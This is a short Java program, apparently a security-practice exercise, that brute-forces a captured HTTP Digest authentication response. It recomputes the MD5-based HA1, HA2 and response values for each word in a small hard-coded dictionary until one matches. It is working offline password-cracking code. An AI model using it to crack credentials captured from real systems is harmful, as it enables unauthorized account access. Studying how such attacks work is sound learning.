package com.example.securitybasicpract;

import org.apache.commons.codec.digest.DigestUtils;

import java.util.List;
import java.util.stream.Stream;

public class CrackingDigestAuthenticationBruteForce {

   /* HA1 =MD5(username:realm:password)
    HA2 = MD5(method:digestURI)
    response=MD5(HA1:nonce:nonceCount:cnonce:qop:HA2)*/

    //given in header
    static String username = "admin";
    static String realm = "admin-digest-realm";
    static String method = "GET";
    static String digestUri = "/test";
    static String nonce = "MTU4MzgxNTMxNDkxMTo0YjEwMmM3ZmI3MGNlZTQ1MDc5ZThhOGI0Zjk0NTk3MQ==";
    static String nonceCount = "00000005";
    static String cnonce = "832676921dde867e";
    static String qop = "auth";
    static String capturedResponse = "3cc71e1afa9b34bcd02eb14855194b47";


    public static void main(String[] args) {

        String passwords[] = passwordDictionary();
        Stream<String> password = Stream.of(passwords);
        password.filter(CrackingDigestAuthenticationBruteForce::digestCalculate).forEach(s -> System.out.println(s));
    }

    public static boolean digestCalculate(String password) {
        String ha1 = HA1(username, realm, password);
        String ha2 = HA2(method, digestUri);
        String response = response(ha1, nonce, nonceCount, cnonce, qop, ha2);
        return isDigestMatch(response);
    }

    public static boolean isDigestMatch(String response) {
        return capturedResponse.equals(response) ? true : false;
    }

    public static String[] passwordDictionary() {
        return new String[]{"satendra", "power", "sa", "random", "saa"};
    }

    public static String HA1(String username, String realm, String password) {
        String prepare = username + ":" + realm + ":" + password;
        return md5(prepare);
    }

    public static String HA2(String method, String digestUsi) {
        String prepare = method + ":" + digestUri;
        return md5(prepare);
    }

    public static String response(String ha1, String nonce, String nonceCount, String cnonce, String qop, String ha2) {
        String prepare = ha1 + ":" + nonce + ":" + nonceCount + ":" + cnonce + ":" + qop + ":" + ha2;
        return md5(prepare);
    }

    public static String md5(String raw) {
        return DigestUtils.md5Hex(raw);
    }


}
